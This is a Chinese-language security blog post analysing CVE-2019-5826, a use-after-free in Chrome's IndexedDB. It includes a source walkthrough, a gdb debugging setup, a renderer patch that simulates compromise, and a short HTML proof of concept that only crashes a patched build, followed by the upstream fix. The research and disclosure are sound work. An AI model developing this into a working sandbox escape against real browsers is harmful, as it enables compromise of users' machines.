# Google Chromium CVE-2019-5826 UAF分析

阅读量 **242708**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-10-28 10:00:15

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

## 简介

CVE-2019-5826是Google Chrome里IndexedDB中的Use-after-free漏洞，在版本73.0.3683.86之前该漏洞允许攻击者通过 **搭配render的RCE漏洞** 来造成UAF并 **沙箱逃逸** 。

## 一、环境搭建

笔者所使用的chrome版本为`73.0.3683.75`（[源码](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc)）。下载源码
**并打上patch** ，之后编译运行即可patch如下。至于为什么要打上patch，笔者将在下面详细介绍。

    
    
    // third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc
    void WebIDBFactoryImpl::Open(
           std::make_unique<IndexedDBDatabaseCallbacksImpl>(
               base::WrapUnique(database_callbacks));
       DCHECK(!name.IsNull());
       factory_->Open(GetCallbacksProxy(std::move(callbacks_impl)),
                      GetDatabaseCallbacksProxy(std::move(database_callbacks_impl)),
                      name, version, transaction_id);
    +  if (version == 3) {
    +    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;
    +    auto request = mojo::MakeRequest(&ptr_info);
    +    factory_->DeleteDatabase(std::move(ptr_info), origin, name, true);
    +    factory_->AbortTransactionsForDatabase(origin, base::OnceCallback<void(blink::mojom::IDBStatus)>());
    +  }
     }
    

从[chrome源码](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc)中依次复制

  * `indexed_db_database.cc`
  * `indexed_db_factory_impl.cc`
  * `web_idb_factory_impl.cc`
  * `indexed_db_connection.cc`

等文件中的源码，并将其保存至当前目录中的`chromeSrc`文件夹。这样做的目的是 **为了在调试时可以使用源代码** 。

> 没有源码的调试chrome实在是太痛苦了QwQ

老样子，使用gdb脚本来辅助调试

    
    
    # gdbinit
    # 读取符号
    file ./chrome
    # 设置启动参数
    set args http://localhost:8000/test.html
    # 设置源码路径
    directory chromeSrc/
    # 设置执行fork后继续调试父进程
    set follow-fork-mode parent
    

> 这里没有设置`--headless`，是因为chrome **单次刷新页面的速度比gdb重启chrome的速度快上很多**
> ，这样每次修改完`exploit/poc`后只需点击刷新即可。

输入以下命令即可开启调试

    
    
    gdb -x gdbinit
    

如果执行时提示`No usable sandbox!`，执行以下命令

    
    
    sudo sysctl -w kernel.unprivileged_userns_clone=1
    

**机器重启后该命令将会失效** ，届时需要重新执行。

## 二、IndexedDB简介

Chrome中IndexedDB的大部分是在浏览器进程中实现。 浏览器和渲染中都存在几个不同的mojo
IPC接口，用于进程之间的通信，并且使得沙盒渲染能够执行IndexedDB的操作。

IndexedDBFactory
[mojo接口](https://source.chromium.org/chromium/chromium/src/+/master:third_party/blink/public/mojom/indexeddb/indexeddb.mojom)是渲染的主要入口点。
**大多数操作（打开、关闭数据库等）都是通过IndexedDBFactory实例来进一步操作IndexedDatabase实例** （注意这句话）。

IndexedDB有关于数据库和连接的概念。 对于Chrome-IndexedDB，分别由`IndexedDBDatabase`和`IndexedDBConnection`类表示。 在某一时间段内可以
**存在对同一数据库的多个连接** ，但是每个数据库 **只有一个IndexedDBDatabase对象** 。

另一个要理解的重要概念是 **请求。 打开和删除数据库操作不可能同时发生** ，但会规划执行相应操作的请求。
通过`IndexedDBDatabase::OpenRequest`
和`IndexedDBDatabase::DeleteRequest`类可以实现这些功能。

>
> `OpenRequest`类和`DeleteRequest`类是声明在`IndexedDBDatabase`类中的，换句话说这两个类都是`IndexedDBDatabase`类的子类。

IndexedDBDatabase对象是一种 **引用计数（Reference counted）的对象** 。
针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。
一旦引用计数降至0，会立即释放对象。

释放数据库对象后， **会从数据库映射中删除指向IndexedDBDatabase的相应原始指针** ，这点非常重要。

我们顺便简单了解一下IndexDB的`JS API`

    
    
    dbName = "mycurrent";
    // 打开一个数据库，其中数据库名称为dbName，2为数据库版本
    // 返回一个requests，这个request在这里应该是OpenRequest
    var request = indexedDB.open(dbName, 2);
    // onsuccess是该request处理完成后所执行的回调函数
    request.onsuccess = function (event) {
      // 当该request执行成功后，request中的result成员为所打开的数据库对象
      db = request.result;
    }
    // 关闭一个数据库
    var deleteRequest = indexedDB.deleteDatabase(dbName);
    

> 具体IndexedDB 的细节我们将在下节详细讲解。

## 三、漏洞分析

###  1\. connections_成员变量

在讲解漏洞代码之前，我们先了解一下`IndexedDBDatabase::connections_`成员变量。`connections_`集合存储着
**当前连接至`IndexedDatabase`的所有连接**。当有新connection连接至数据库，或某个connection被中断时，该`connections_`变量都会被修改（执行insert或remove函数）。而该关键变量是一个`list_set`类型的成员。

    
    
    class CONTENT_EXPORT IndexedDBDatabase {
        // ...
        private:
          list_set<IndexedDBConnection*> connections_;
        // ...
    

`list_set`类型是`list`与`set`的结合体，这里我们只需关注该结构体的`end`函数。

    
    
    iterator end() { return iterator(list_.end()); }
    

可以看到，`list_set::end`函数返回的是 **list的迭代器** 。

### 2\. database _map_ 成员变量

该成员变量保存了所有指向打开的`IndexedDatabase`的 **原始指针**

> 注意，直接使用C++的原始指针通常是一个比较危险的事情。
    
    
    class CONTENT_EXPORT IndexedDBFactoryImpl : public IndexedDBFactory {
     // ...
     private:
      // ...
      std::map<IndexedDBDatabase::Identifier, IndexedDBDatabase*> database_map_;
    }
    

当打开一个新的数据库时，指向该数据库的原始指针将会被添加进`database_map_`中；同样当关闭一个数据库时，指向该数据库的原始指针将会从`database_map_`中被移除。

###  3\. 漏洞流程

####  a. “悬垂”指针

我们先来简单了解一下删除数据库的流程。

当JS中执行`indexedDB.deleteDatabase`函数时，通过render与chrome之间的IPC通信，chrome进程会执行[IndexedDBFactoryImpl::DeleteDatabase](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_factory_impl.cc;l=492;bpv=0;bpt=1)函数，在该函数中，程序会进一步调用对应`IndexedDBDatabase`的`DeleteDatabase`函数来处理对应的数据库。

    
    
    void IndexedDBFactoryImpl::DeleteDatabase(
            const base::string16& name,
            scoped_refptr<IndexedDBCallbacks> callbacks,
            const Origin& origin,
            const base::FilePath& data_directory,
            bool force_close) {
      IDB_TRACE("IndexedDBFactoryImpl::DeleteDatabase");
      // 每个IndexedDatabase在IndexedDBFactoryImpl类中都有对应唯一的idntifier
      // 该函数通过数据库名称来获取identifier并进一步在database_map中查找对应的IndexedDatabase指针
      IndexedDBDatabase::Identifier unique_identifier(origin, name);
      const auto& it = database_map_.find(unique_identifier);
      if (it != database_map_.end()) {
        // 如果找到了对应的数据库，则执行该数据库的DeleteDatabase函数
        it->second->DeleteDatabase(callbacks, force_close);
        return;
      }
      // ...
    

在[IndexedDBDatabase::DeleteDatabase](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1862)中，程序会添加一个`DeleteRequest`到当前`IndexedDatabase`中的待处理请求列表中，当数据库处理到`DeleteRequest`时，数据库就会马上关闭。这样做的目的是为了
**在剩余的请求（`DeleteRequest`前的所有请求）全部处理完之后，再关闭当前数据库**。

    
    
    void IndexedDBDatabase::DeleteDatabase(
        scoped_refptr<IndexedDBCallbacks> callbacks,
        bool force_close) {
      AppendRequest(std::make_unique<DeleteRequest>(this, callbacks));
      // Close the connections only after the request is queued to make sure
      // the store is still open.
      if (force_close)
        ForceClose();
    }
    

但是倘若
**设置了`force_close`标志**后，则程序将会进一步执行`ForceClose`函数来强制关闭所有的`request`和`connection`。但是，第二段
**用于遍历关闭连接的代码** 在修改`connections_`时 **并不安全** 。 **（漏洞点!）**

    
    
    void IndexedDBDatabase::ForceClose() {
      // IndexedDBConnection::ForceClose() may delete this database, so hold ref.
      scoped_refptr<IndexedDBDatabase> protect(this);
      // 循环将所有尚未处理的请求强制关闭
      while (!pending_requests_.empty()) {
        std::unique_ptr<ConnectionRequest> request =
            std::move(pending_requests_.front());
        pending_requests_.pop();
        request->AbortForForceClose();
      }
      // 循环将所有连接到当前数据库的connections强制断开
      // 注意！这段代码在修改connection_时不够安全
      auto it = connections_.begin();
      while (it != connections_.end()) {
        IndexedDBConnection* connection = *it++;
        // 注意这一步，执行`connection->ForceClose()`时，程序会关闭当前连接。
        // 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接
        connection->ForceClose();
      }
      // 常规检查
      DCHECK(connections_.empty());
      DCHECK(!active_request_);
    }
    

在第二个用于关闭connection的循环中，程序会执行`connection->ForceClose()`，即[IndexedDBConnection::ForceClose函数](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_connection.cc;l=48;bpv=0;bpt=0)，以强制关闭该connection。而为了在`IndexedDBDatabase`中释放当前连接在数据库中所占用的资源，在这个函数中，程序会进一步调用`IndexedDBDatabase::Close`函数。

    
    
    void IndexedDBConnection::ForceClose() {
      if (!callbacks_.get())
        return;
    
      // IndexedDBDatabase::Close() can delete this instance.
      base::WeakPtr<IndexedDBConnection> this_obj = weak_factory_.GetWeakPtr();
      scoped_refptr<IndexedDBDatabaseCallbacks> callbacks(callbacks_);
      // 注意这条代码
      database_->Close(this, true /* forced */);
      if (this_obj) {
        database_ = nullptr;
        callbacks_ = nullptr;
        active_observers_.clear();
      }
      callbacks->OnForcedClose();
    }
    

[IndexDBDatabase::Close函数](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=1897)会依次执行一系列操作，但这里我们只关注两个操作。该函数中，程序会先
**在`connection_`集合中删除当前连接**，之后 **执行`active_request_->OnConnectionClosed`函数**。

    
    
    void IndexedDBDatabase::Close(IndexedDBConnection* connection, bool forced) {
      DCHECK(connections_.count(connection));
      DCHECK(connection->IsConnected());
      DCHECK(connection->database() == this);
    
      IDB_TRACE("IndexedDBDatabase::Close");
    
      // 终止当前连接中所有的未完成事务
      connection->FinishAllTransactions(IndexedDBDatabaseError(
          blink::kWebIDBDatabaseExceptionUnknownError, "Connection is closing."));
    
      // 从数据库中的connections_集合中删除当前request
      connections_.erase(connection);
    
      // 通知当前正在处理的请求，因为当前请求可能需要进行清理或者继续进行操作
      if (active_request_)
        active_request_->OnConnectionClosed(connection);
    
      // 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针
      if (connections_.empty() && !active_request_ && pending_requests_.empty()) {
        backing_store_ = nullptr;
        factory_->ReleaseDatabase(identifier_, forced);
      }
    }
    

`OnConnectionClosed`函数中会先判断当前待处理connection **是否被过早关闭** 。

    
    
    void OnConnectionClosed(IndexedDBConnection* connection) override {
        // 如果连接过早关闭（即一个pending的connection被关闭了，此时会调用OnConnectionClosed
        if (connection && connection->callbacks() == pending_->database_callbacks) {
            pending_->callbacks->OnError(
                IndexedDBDatabaseError(blink::kWebIDBDatabaseExceptionAbortError,
                                       "The connection was closed."));
            // 该连接将在数据库中被重置
            db_->RequestComplete(this);
            return;
        }
        // 如果当前connection不是最后一个要处理的连接，则不会执行到StartUpgrade创建新连接。
        if (!db_->connections_.empty())
            return;
    
        StartUpgrade();
    }
    

如果当前连接类型不为`pending connection`，即 **该连接并非被过早关闭** （即正常情况，正常情况是比异常情况更容易触发的），并且
**当前连接为connections_中的最后一个连接**
。则该函数会执行[StartUpgrade](https://source.chromium.org/chromium/chromium/src/+/refs/tags/73.0.3683.75:content/browser/indexed_db/indexed_db_database.cc;l=243)函数，`StartUpgrade`函数内部会使得IndexedDBDatabase
**创建一个新的pending connection至connections_列表中** 。

    
    
    // Initiate the upgrade. The bulk of the work actually happens in
    // IndexedDBDatabase::VersionChangeOperation in order to kick the
    // transaction into the correct state.
    void StartUpgrade() {
        // 使数据库创建一个新的连接
        connection_ = db_->CreateConnection(pending_->database_callbacks,
                                            pending_->child_process_id);
        DCHECK_EQ(db_->connections_.count(connection_.get()), 1UL);
    
        std::vector<int64_t> object_store_ids;
    
        IndexedDBTransaction* transaction = connection_->CreateTransaction(
            pending_->transaction_id,
            std::set<int64_t>(object_store_ids.begin(), object_store_ids.end()),
            blink::mojom::IDBTransactionMode::VersionChange,
            new IndexedDBBackingStore::Transaction(db_->backing_store()));
        db_->RegisterAndScheduleTransaction(transaction);
    
        transaction->ScheduleTask(
            base::BindOnce(&IndexedDBDatabase::VersionChangeOperation, db_,
                           pending_->version, pending_->callbacks));
    }
    

这样，`connections_`集合元素将不为0。当控制流从`OnConnectionClosed`函数返回时，便无法通过下面的判断。这样，就无法执行`factory_->ReleaseDatabase`。

>
> 预期情况是，当最后一个连接被erase后，一定进入下面的if语句以执行`factory_->ReleaseDatabase`，但在这里显然是一个非预期情况。
    
    
    void IndexedDBDatabase::Close(IndexedDBConnection* connection, bool forced) {
      // ...
      if (active_request_)
        active_request_->OnConnectionClosed(connection);
    
      // 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针
      if (connections_.empty() && !active_request_ && pending_requests_.empty()) {
        backing_store_ = nullptr;
        factory_->ReleaseDatabase(identifier_, forced);
      }
    }
    

而`factory_->ReleaseDatabase`函数会将 **指向当前数据库的原始指针**
从`database_map_`中删除，也就是说，若`IndexedDBFactoryImpl::ReleaseDatabase`不被执行，则
**该原始指针就一直保存在`database_map_`中**。

    
    
    void IndexedDBFactoryImpl::ReleaseDatabase(
        const IndexedDBDatabase::Identifier& identifier,
        bool forced_close) {
      DCHECK(!database_map_.find(identifier)->second->backing_store());
      // 将当前IndexedDatabase原始指针从database_map中删除
      RemoveDatabaseFromMaps(identifier);
    
      // No grace period on a forced-close, as the initiator is
      // assuming the backing store will be released once all
      // connections are closed.
      ReleaseBackingStore(identifier.first, forced_close);
    }
    

最终，`database_map_`中保留的 **原始指针并没有被删除** 。

同时，当控制流返回`IndexedDBDatabase::ForceClose`函数时，由于`connections_`集合既执行了`erase`函数，又执行了`insert`函数，因此在下一次判断循环条件`it
!= connections_.end()`时，`connection_`集合中仍然存在connection（尽管此时的连接非彼时的连接），
**connection_集合的元素个数将保持不变** 。而`end`函数返回的是`list`的迭代器，
**所以返回的`end`迭代器将保证不变**，而`it++`，因此将跳出该循环，结束 **连接的终止操作**
。但最重要的是，`IndexedDBFactoryImpl::database_map`中 **仍然保留指向当前数据库的原始指针**
。该指针本应该在当前循环执行结束时被移除，但这里却没有被移除。

    
    
    void IndexedDBDatabase::ForceClose() {
      // ...
      auto it = connections_.begin();
      while (it != connections_.end()) {
        IndexedDBConnection* connection = *it++;
        // 注意这一步，执行`connection->ForceClose()`时，程序会关闭当前连接。
        // 但倘若当前遍历的连接是connection_中的最后一条连接，则会执行函数StartUpgrade以建立新连接
        connection->ForceClose();
      }
      // ...
    }
    

现在，我们可以成功将指向当前`IndexedDatabase`的一个原始指针保存至 **本不该保存的地方**
(指`database_map`)。而我们下一步要做的就是尝试将当前`IndexedDatabase`所使用的内存释放。

####  b. 释放IndexedDB内存

IndexedDBDatabase对象是一种 **引用计数（Reference counted）的对象** 。
针对该对象的计数引用被保存在IndexedDBConnection对象、IndexedDBTransaction对象或其他正在进行或待处理的请求对象中。
一旦引用计数降至0，会立即释放对象。（以免忘记，这段又重复了一遍）

    
    
    class CONTENT_EXPORT IndexedDBConnection {
     // ...
      // NULL in some unit tests, and after the connection is closed.
      scoped_refptr<IndexedDBDatabase> database_;
     // ...
    };
    
    class CONTENT_EXPORT IndexedDBTransaction {
     // ...
      scoped_refptr<IndexedDBDatabase> database_;
     // ...
    }
    

也就是说，一旦我们将所有与当前IndexedDBDatabase对象相关的Connection和Transaction对象全部释放，那么当前IndexedDBDatabase就会因为引用计数为0而自动释放。

Issue941746给出了一种方法 ——
通过调用`IndexedDBFactoryImpl::AbortTransactionsForDatabase`来释放IndexedDBDatabase对象。

    
    
    // 函数调用call
    content::IndexedDBFactoryImpl::AbortTransactionsForDatabase
      content::IndexedDBFactoryImpl::AbortTransactions                 // 循环对所有IndexedDatabase执行AbortAllTransactionsForConnections
        content::IndexedDBDatabase::AbortAllTransactionsForConnections // 循环对所有Connection执行FinishAllTransactions
          content::IndexedDBConnection::FinishAllTransactions          // 循环对所有Transactions执行Abort
            content::IndexedDBTransaction::Abort
              content::IndexedDBConnection::RemoveTransaction          // 释放Transaction
              content::IndexedDBDatabase::TransactionFinished          // 释放Connection
    

执行`AbortTransactionsForDatabase`函数将会释放所有的`IndexedDBConnection`以及`IndexedDBTransaction`，进而释放`IndexedDatabase`对象，如此就能达到我们想要释放某个IndexedDatabase对象的目的。

> 这里贴出IndexedDBTransaction::Abort函数的关键代码。 **请注意函数内部的注释** 。
    
    
    void IndexedDBTransaction::Abort(const IndexedDBDatabaseError& error) {
      // ...
      database_->TransactionFinished(this, false);
    
      // RemoveTransaction will delete |this|.
      // Note: During force-close situations, the connection can be destroyed during
      // the |IndexedDBDatabase::TransactionFinished| call
      // 上面这段注释表示，在`force_close = true`的前提下，执行该函数将会释放connection以及trasaction
      if (connection_)
        connection_->RemoveTransaction(id_);
    }
    

####  c. 如何触发UAF

根据上面的分析，我们可以得出，当顺序调用这三个函数时，我们便可以成功使`database_map`中保存一个指向已被释放内存的悬垂指针。

  * `Open(db1)`
  * `DeleteDatabase(db1, force_close=True)`
  * `AbortTransactionsForDatabase`

之后，我们只需通过Heap Spray将这块被释放的内存重新分配回来即可利用。

但这里有个问题，如何在render进程中通过IndexedDBFactory来调用这三个函数呢？实际上，render的JS接口可以调用IndexedDB的`open`和`deleteDatabase`，但无法调用`AbortTransactionsForDatabase`接口。同时，这里存在一个问题，
**我们无法保证browser进程中的函数执行顺序如我们所期待的那样** ，因为Js中IndexedDB接口大多都是 **异步**
的，因此browser中的这三个函数可能无法依次、完全的完成执行。

但我们又必须在render进程中依次同步执行这三个函数，而这就是为什么 **该漏洞只能在`render RCE`的基础上利用**的原因了。由于
**`render RCE`可以给render进程自己打上patch**，所以就可以在render进程中打patch **以保证这三个函数可以被同步调用**
（即依次执行）。

> 这也是为什么在 **环境搭建** 时要在chrome源码中打上patch的原因，因为手动打上patch可以模拟render RCE 打patch的结果。
    
    
    // third_party/blink/renderer/modules/indexeddb/web_idb_factory_impl.cc
    void WebIDBFactoryImpl::Open(
           std::make_unique<IndexedDBDatabaseCallbacksImpl>(
               base::WrapUnique(database_callbacks));
       DCHECK(!name.IsNull());
       factory_->Open(GetCallbacksProxy(std::move(callbacks_impl)),
                      GetDatabaseCallbacksProxy(std::move(database_callbacks_impl)),
                      name, version, transaction_id);
    +  if (version == 3) {
    +    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr_info;
    +    auto request = mojo::MakeRequest(&ptr_info);
    +    factory_->DeleteDatabase(std::move(ptr_info), origin, name, true);
    +    factory_->AbortTransactionsForDatabase(origin, base::OnceCallback<void(blink::mojom::IDBStatus)>());
    +  }
     }
    

####  d. POC

笔者在`issue 941746`提供的poc上做了一点修改，新构造的POC删除了无用的语句，并使Chrome触发Crash

    
    
    <html>
    
    <head>
        <script type="text/javascript">
            async function poc() {
                /*
                    在chrome进程中依次同步执行open、deleteDatabase以及AbortTransactionsForDatabase函数
                    执行完成后将会产生一个悬垂指针
                */
                await window.indexedDB.open("db1", 3);
                // 尝试使用这个悬垂指针，应该会造成crash
                window.indexedDB.deleteDatabase("db1");
            }
    
        </script>
    </head>
    
    <body onload="poc()"></body>
    
    </html>
    

Chrome成功crash

![](https://p0.ssl.qhimg.com/t0113d8e5d4691cb706.png)

> 图中多输出的`nice`，为chrome打patch时多添加的一条printf语句
>
> 该语句的输出表示patch部分代码被执行。

###  4\. 后记

以下是chrome团队修复后的代码。该[patch](https://chromium.googlesource.com/chromium/src.git/+/eaf2e8bce3855d362e53034bd83f0e3aff8714e4%5E%21/)彻彻底底将`connections_`集合中的所有连接全部关闭。patch前的代码依赖
**迭代器** 来判断是否全部关闭所有连接，而patch后的代码使用集合元素个数来进行判断，某种程度上使得代码更加安全。

    
    
    @@ -1949,10 +1949,10 @@
         request->AbortForForceClose();
       }
    
    -  auto it = connections_.begin();
    -  while (it != connections_.end()) {
    -    IndexedDBConnection* connection = *it++;
    +  while (!connections_.empty()) {
    +    IndexedDBConnection* connection = *connections_.begin();
         connection->ForceClose();
    +    connections_.erase(connection);
       }
       DCHECK(connections_.empty());
       DCHECK(!active_request_);
    

## 四、参考

[The Most Secure Browser? Pwning Chrome from 2016 to
2019](https://www.blackhat.com/us-19/briefings/schedule/index.html#the-most-secure-browser-pwning-chrome-from--to--16274)

  * [Presentation Slides](http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019.pdf)
  * [White Paper](http://i.blackhat.com/USA-19/Wednesday/us-19-Feng-The-Most-Secure-Browser-Pwning-Chrome-From-2016-To-2019-wp.pdf)

[NVD – CVE-2019-5826 Dtail](https://nvd.nist.gov/vuln/detail/CVE-2019-5826)

[Chrome Issue 941746: Security: UAF in
content::IndexedDBDatabase](https://crbug.com/941746)

[通过IndexedDB条件竞争实现Chrome沙箱逃逸（上）](https://www.anquanke.com/post/id/183809#h3-3)

> 该文章 **并没有涉及** 我们当前所研究的UAF漏洞，但即便如此，它仍然提供了一些关于`IndexedDB`相关的说明。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Kiprey** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/220698](/post/id/220698)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CVE](/tag/CVE)
  * [UAF](/tag/UAF)
  * [Chromium](/tag/Chromium)

 **+1** __2赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=Ggib7X9SSVicoZnE34KxGlzg&s=40&t=1506914961)
Kiprey

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

